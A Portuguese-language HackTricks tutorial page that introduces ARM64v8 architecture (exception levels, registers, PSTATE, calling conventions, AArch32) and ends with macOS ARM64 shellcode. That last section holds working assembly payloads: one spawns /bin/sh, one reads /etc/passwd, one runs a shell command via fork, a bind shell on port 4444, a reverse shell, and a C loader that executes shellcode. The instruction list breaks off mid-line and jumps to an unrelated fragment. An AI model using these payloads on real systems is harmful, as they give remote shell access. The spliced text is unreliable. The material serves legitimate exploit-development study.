# Introdução ao ARM64v8

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Níveis de Exceção - EL (ARM64v8)**

Na arquitetura ARMv8, os níveis de execução, conhecidos como Níveis de Exceção (ELs), definem o nível de privilégio e as capacidades do ambiente de execução. Existem quatro níveis de exceção, variando de EL0 a EL3, cada um com um propósito diferente:

1. **EL0 - Modo Usuário**:
* Este é o nível menos privilegiado e é usado para executar código de aplicativos regulares.
* Aplicações executadas no EL0 são isoladas umas das outras e do software do sistema, aumentando a segurança e estabilidade.
2. **EL1 - Modo Kernel do Sistema Operacional**:
* A maioria dos kernels de sistemas operacionais rodam neste nível.
* EL1 tem mais privilégios que EL0 e pode acessar recursos do sistema, mas com algumas restrições para garantir a integridade do sistema.
3. **EL2 - Modo Hipervisor**:
* Este nível é usado para virtualização. Um hipervisor executando no EL2 pode gerenciar múltiplos sistemas operacionais (cada um em seu próprio EL1) rodando no mesmo hardware físico.
* EL2 fornece recursos para isolamento e controle dos ambientes virtualizados.
4. **EL3 - Modo Monitor Seguro**:
* Este é o nível mais privilegiado e é frequentemente usado para inicialização segura e ambientes de execução confiáveis.
* EL3 pode gerenciar e controlar acessos entre estados seguros e não seguros (como inicialização segura, sistema operacional confiável, etc.).

O uso desses níveis permite uma maneira estruturada e segura de gerenciar diferentes aspectos do sistema, desde aplicações de usuários até o software de sistema mais privilegiado. A abordagem da ARMv8 para níveis de privilégio ajuda a isolar efetivamente diferentes componentes do sistema, aumentando assim a segurança e robustez do sistema.

## **Registradores (ARM64v8)**

ARM64 possui **31 registradores de uso geral**, rotulados de `x0` a `x30`. Cada um pode armazenar um valor de **64 bits** (8 bytes). Para operações que requerem apenas valores de 32 bits, os mesmos registradores podem ser acessados em um modo de 32 bits usando os nomes w0 a w30.

1. **`x0`** a **`x7`** - Tipicamente usados como registradores temporários e para passar parâmetros para sub-rotinas.
* **`x0`** também carrega o dado de retorno de uma função
2. **`x8`** - No kernel do Linux, `x8` é usado como o número da chamada de sistema para a instrução `svc`. **No macOS o x16 é o utilizado!**
3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
4. **`x16`** e **`x17`** - **Registradores de Chamada Intraprocedural**. Registradores temporários para valores imediatos. Também são usados para chamadas de função indiretas e stubs da Tabela de Ligação de Procedimentos (PLT).
* **`x16`** é usado como o **número da chamada de sistema** para a instrução **`svc`** no **macOS**.
5. **`x18`** - **Registrador da Plataforma**. Pode ser usado como um registrador de uso geral, mas em algumas plataformas, este registrador é reservado para usos específicos da plataforma: Ponteiro para o bloco de ambiente de thread atual no Windows, ou para apontar para a estrutura de tarefa em execução atual no kernel do Linux.
6. **`x19`** a **`x28`** - Estes são registradores preservados pelo chamador. Uma função deve preservar os valores destes registradores para seu chamador, então eles são armazenados na pilha e recuperados antes de voltar ao chamador.
7. **`x29`** - **Ponteiro de quadro** para acompanhar o quadro de pilha. Quando um novo quadro de pilha é criado porque uma função é chamada, o registrador **`x29`** é **armazenado na pilha** e o **novo** endereço do ponteiro de quadro é (**`sp`** endereço) é **armazenado neste registro**.
* Este registrador também pode ser usado como um **registro de uso geral** embora geralmente seja usado como referência para **variáveis locais**.
8. **`x30`** ou **`lr`**- **Registrador de Link**. Ele contém o **endereço de retorno** quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada armazenando o valor de **`pc`** neste registrador.
* Ele também pode ser usado como qualquer outro registrador.
9. **`sp`** - **Ponteiro de pilha**, usado para acompanhar o topo da pilha.
* o valor de **`sp`** sempre deve ser mantido com pelo menos um **alinhamento de quadword** ou uma exceção de alinhamento pode ocorrer.
10. **`pc`** - **Contador de programa**, que aponta para a próxima instrução. Este registrador só pode ser atualizado através de gerações de exceção, retornos de exceção e ramificações. As únicas instruções ordinárias que podem ler este registrador são as instruções de ramificação com link (BL, BLR) para armazenar o endereço de **`pc`** em **`lr`** (Registrador de Link).
11. **`xzr`** - **Registrador Zero**. Também chamado de **`wzr`** em sua forma de registrador de **32 bits**. Pode ser usado para obter facilmente o valor zero (operação comum) ou para realizar comparações usando **`subs`** como **`subs XZR, Xn, #10`** armazenando os dados resultantes em lugar nenhum (em **`xzr`**).

Os registradores **`Wn`** são a versão **32 bits** do registrador **`Xn`**.

### SIMD e Registradores de Ponto Flutuante

Além disso, existem outros **32 registradores de 128 bits** que podem ser usados em operações otimizadas de dados múltiplos de instrução única (SIMD) e para realizar aritmética de ponto flutuante. Estes são chamados de registradores Vn embora também possam operar em **64 bits**, **32 bits**, **16 bits** e **8 bits** e então são chamados **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.

### Registradores do Sistema

**Existem centenas de registradores do sistema**, também chamados de registradores de propósito especial (SPRs), usados para **monitorar** e **controlar** o comportamento dos **processadores**.\
Eles só podem ser lidos ou configurados usando a instrução especial dedicada **`mrs`** e **`msr`**.

Os registradores especiais **`TPIDR_EL0`** e **`TPIDDR_EL0`** são comumente encontrados ao fazer engenharia reversa. O sufixo `EL0` indica o **nível mínimo de exceção** do qual o registrador pode ser acessado (neste caso, EL0 é o nível regular de exceção (privilégio) com o qual os programas regulares são executados).\
Eles são frequentemente usados para armazenar o **endereço base do armazenamento local da thread** na memória. Geralmente, o primeiro é legível e gravável para programas executados em EL0, mas o segundo pode ser lido de EL0 e escrito de EL1 (como kernel).

* `mrs x0, TPIDR_EL0 ; Lê TPIDR_EL0 em x0`
* `msr TPIDR_EL0, X0 ; Escreve x0 em TPIDR_EL0`

### **PSTATE**

**PSTATE** contém vários componentes do processo serializados no registrador especial visível pelo sistema operacional **`SPSR_ELx`**, sendo X o **nível de permissão da exceção acionada** (isso permite recuperar o estado do processo quando a exceção termina).\
Estes são os campos acessíveis:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* Os **`N`**, **`Z`**, **`C`** e **`V`** flags de condição:
* **`N`** significa que a operação resultou em um valor negativo
* **`Z`** significa que a operação resultou em zero
* **`C`** significa que a operação teve um carry
* **`V`** significa que a operação resultou em um overflow assinado:
* A soma de dois números positivos resulta em um valor negativo.
* A soma de dois números negativos resulta em um valor positivo.
* Na subtração, quando um número negativo grande é subtraído de um número positivo menor (ou vice-versa), e o resultado não pode ser representado dentro do intervalo do tamanho de bits dado.

{% hint style="warning" %}
Nem todas as instruções atualizam essas flags. Algumas como **`CMP`** ou **`TST`** fazem, e outras que têm um sufixo s como **`ADDS`** também o fazem.
{% endhint %}

* A flag de **largura do registrador atual (`nRW`)**: Se a flag tiver o valor 0, o programa será executado no estado de execução AArch64 assim que for retomado.
* O **Nível de Exceção atual** (**`EL`**): Um programa regular executado em EL0 terá o valor 0
* A flag de **passo único** (**`SS`**): Usada por depuradores para passo único configurando a flag SS para 1 dentro de **`SPSR_ELx`** através de uma exceção. O programa executará um passo e emitirá uma exceção de passo único.
* A flag de estado de exceção ilegal (**`IL`**): É usada para marcar quando um software privilegiado realiza uma transferência de nível de exceção inválida, esta flag é configurada para 1 e o processador aciona uma exceção de estado ilegal.
* As flags **`DAIF`**: Essas flags permitem que um programa privilegiado mascare seletivamente certas exceções externas.
* Se **`A`** for 1, significa que abortos assíncronos serão acionados. O **`I`** configura para responder a **Pedidos de Interrupção de Hardware** (IRQs) externos. e o F está relacionado a **Pedidos de Interrupção Rápida** (FIRs).
* As flags de seleção do ponteiro de pilha (**`SPS`**): Programas privilegiados executados em EL1 e acima podem alternar entre usar seu próprio registrador de ponteiro de pilha e o do modelo de usuário (por exemplo, entre `SP_EL1` e `EL0`). Esta troca é realizada escrevendo no registrador especial **`SPSel`**. Isso não pode ser feito a partir de EL0.

## **Convenção de Chamada (ARM64v8)**

A convenção de chamada ARM64 especifica que os **primeiros oito parâmetros** para uma função são passados em registradores **`x0` a `x7`**. **Parâmetros adicionais** são passados na **pilha**. O valor de **retorno** é passado de volta no registrador **`x0`**, ou em **`x1`** também **se tiver 128 bits de comprimento**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** através de chamadas de função.

Ao ler uma função em assembly, procure pelo **prólogo e epílogo da função**. O **prólogo** geralmente envolve **salvar o ponteiro de quadro (`x29`)**, **configurar** um **novo ponteiro de quadro**, e **alocar espaço na pilha**. O **epílogo** geralmente envolve **restaurar o ponteiro de quadro salvo** e **retornar** da função.

### Convenção de Chamada em Swift

Swift tem sua própria **convenção de chamada** que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instruções Comuns (ARM64v8)**

Instruções ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser realizada (como `add`, `sub`, `mov`, etc.), **`dst`** é o registrador **destino** onde o resultado será armazenado, e **`src1`** e **`src2`** são os registradores **fonte**. Valores imediatos também podem ser usados no lugar de registradores fonte.

* **`mov`**: **Move** um valor de um **registrador** para outro.
* Exemplo: `mov x0, x1` — Isso move o valor de `x1` para `x0`.
* **`ldr`**: **Carrega** um valor da **memória** para um **registrador**.
* Exemplo: `ldr x0, [x1]` — Isso carrega um valor do local de memória apontado por `x1` para `x0`.
* **`str`**: **Armazena** um valor de um **registrador** na **memória**.
* Exemplo: `str x0, [x1]` — Isso armazena o valor em `x0` no local de memória apontado por `x1`.
* **`ldp`**: **Carrega Par de Registradores**. Esta instrução **carrega dois registradores** de **locais de memória consecutivos**. O endereço de memória é tipicamente formado adicionando um deslocamento ao valor em outro registrador.
* Exemplo: `ldp x0, x1, [x2]` — Isso carrega `x0` e `x1` dos locais de memória em `x2` e `x2 + 8`, respectivamente.
* **`stp`**: **Armazena Par de Registradores**. Esta instrução **armazena dois registradores** em **locais de memória consecutivos**. O endereço de memória é tipicamente formado adicionando um deslocamento ao valor em outro registrador.
* Exemplo: `stp x0, x1, [x2]` — Isso armazena `x0` e `x1` nos locais de memória em `x2` e `x2 + 8`, respectivamente.
* **`add`**: **Adiciona** os valores de dois registradores e armazena o resultado em um registrador.
* Sintaxe: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> Destino
* Xn2 -> Operando 1
* Xn3 | #imm -> Operando 2 (registrador ou imediato)
* \[shift #N | RRX] -> Realiza um deslocamento ou chama RRX
* Exemplo: `add x0, x1, x2` — Isso adiciona os valores em `x1` e `x2` e armazena o resultado em `x0`.
* `add x5,
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Retorno**: `ret` (devolve o controle ao chamador usando o endereço no registro de ligação)

## Estado de Execução AARCH32

Armv8-A suporta a execução de programas de 32 bits. **AArch32** pode rodar em um de **dois conjuntos de instruções**: **`A32`** e **`T32`** e pode alternar entre eles via **`interworking`**.\
Programas **privilegiados** de 64 bits podem agendar a **execução de programas de 32 bits** executando uma transferência de nível de exceção para o 32 bits menos privilegiado.\
Note que a transição de 64 bits para 32 bits ocorre com uma diminuição do nível de exceção (por exemplo, um programa de 64 bits em EL1 acionando um programa em EL0). Isso é feito configurando o **bit 4 do** **`SPSR_ELx`** registro especial **para 1** quando o processo de thread `AArch32` está pronto para ser executado e o restante do `SPSR_ELx` armazena o CPSR dos programas **`AArch32`**. Então, o processo privilegiado chama a instrução **`ERET`** para que o processador faça a transição para **`AArch32`** entrando em A32 ou T32 dependendo do CPSR**.**

O **`interworking`** ocorre usando os bits J e T do CPSR. `J=0` e `T=0` significa **`A32`** e `J=0` e `T=1` significa **T32**. Isso basicamente se traduz em configurar o **bit mais baixo para 1** para indicar que o conjunto de instruções é T32.\
Isso é configurado durante as **instruções de ramificação de interworking**, mas também pode ser configurado diretamente com outras instruções quando o PC é definido como o registro de destino. Exemplo:

Outro exemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registradores

Existem 16 registradores de 32 bits (r0-r15). **Do r0 ao r14** eles podem ser usados para **qualquer operação**, no entanto, alguns deles geralmente são reservados:

* **`r15`**: Contador de programa (sempre). Contém o endereço da próxima instrução. Em A32 atual + 8, em T32, atual + 4.
* **`r11`**: Ponteiro de Quadro
* **`r12`**: Registrador de chamada intra-procedural
* **`r13`**: Ponteiro de Pilha
* **`r14`**: Registrador de Ligação

Além disso, os registradores são respaldados em **`registradores bancados`**. São locais que armazenam os valores dos registradores permitindo realizar **trocas de contexto rápidas** no tratamento de exceções e operações privilegiadas para evitar a necessidade de salvar e restaurar registradores manualmente toda vez.\
Isso é feito **salvando o estado do processador do `CPSR` para o `SPSR`** do modo de processador para o qual a exceção é tomada. No retorno da exceção, o **`CPSR`** é restaurado a partir do **`SPSR`**.

### CPSR - Registrador de Status do Programa Atual

Em AArch32, o CPSR funciona de maneira semelhante ao **`PSTATE`** em AArch64 e também é armazenado em **`SPSR_ELx`** quando uma exceção é tomada para restaurar posteriormente a execução:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Os campos são divididos em alguns grupos:

* Registrador de Status do Programa de Aplicação (APSR): Flags aritméticas e acessíveis a partir do EL0
* Registradores de Estado de Execução: Comportamento do processo (gerenciado pelo SO).

#### Registrador de Status do Programa de Aplicação (APSR)

* As flags **`N`**, **`Z`**, **`C`**, **`V`** (assim como em AArch64)
* A flag **`Q`**: É definida como 1 sempre que ocorre **saturação de inteiro** durante a execução de uma instrução aritmética de saturação especializada. Uma vez definida como **`1`**, manterá o valor até que seja manualmente definida como 0. Além disso, não há nenhuma instrução que verifique seu valor implicitamente, deve ser feito lendo manualmente.
*   Flags **`GE`** (Maior ou igual): São usadas em operações SIMD (Instrução Única, Dados Múltiplos), como "adição paralela" e "subtração paralela". Essas operações permitem processar vários pontos de dados em uma única instrução.

Por exemplo, a instrução **`UADD8`** **adiciona quatro pares de bytes** (de dois operandos de 32 bits) em paralelo e armazena os resultados em um registrador de 32 bits. Em seguida, **define as flags `GE` no `APSR`** com base nesses resultados. Cada flag GE corresponde a uma das adições de byte, indicando se a adição para aquele par de bytes **transbordou**.

A instrução **`SEL`** usa essas flags GE para realizar ações condicionais.

#### Registradores de Estado de Execução

* Os bits **`J`** e **`T`**: **`J`** deve ser 0 e se **`T`** for 0, o conjunto de instruções A32 é usado, e se for 1, o T32 é usado.
* **Registrador de Estado do Bloco IT** (`ITSTATE`): São os bits de 10-15 e 25-26. Eles armazenam condições para instruções dentro de um grupo prefixado com **`IT`**.
* Bit **`E`**: Indica a **ordenação dos bytes** (endianness).
* **Bits de Máscara de Modo e Exceção** (0-4): Determinam o estado atual de execução. O **quinto** indica se o programa é executado como 32 bits (um 1) ou 64 bits (um 0). Os outros 4 representam o **modo de exceção atualmente em uso** (quando uma exceção ocorre e está sendo tratada). O número definido **indica a prioridade atual** caso outra exceção seja acionada enquanto esta está sendo tratada.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: Certas exceções podem ser desativadas usando os bits **`A`**, `I`, `F`. Se **`A`** for 1, significa que abortos assíncronos serão acionados. O **`I`** configura para responder a **Pedidos de Interrupção de Hardware Externo** (IRQs). e o F está relacionado a **Pedidos de Interrupção Rápida** (FIRs).

## macOS

### Syscalls BSD

Confira [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Syscalls BSD terão **x16 > 0**.

### Armadilhas Mach

Confira [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html). Armadilhas Mach terão **x16 < 0**, então você precisa chamar os números da lista anterior com um **menos**: **`_kernelrpc_mach_vm_allocate_trap`** é **`-10`**.

Você também pode verificar **`libsystem_kernel.dylib`** em um desmontador para descobrir como chamar essas syscalls (e BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Às vezes é mais fácil verificar o código **decompilado** de **`libsystem_kernel.dylib`** do que verificar o **código fonte** porque o código de várias syscalls (BSD e Mach) é gerado por scripts (verifique os comentários no código fonte), enquanto na dylib você pode encontrar o que está sendo chamado.
{% endhint %}

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extrair os bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Código em C para testar o shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Retirado [**daqui**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e explicado.

{% tabs %}
{% tab title="com adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="com pilha" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Ler com cat

O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (o que na memória significa uma pilha dos endereços).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando com sh a partir de um fork para que o processo principal não seja encerrado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell de [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **porta 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Shell reverso

De [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), shell reverso para **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
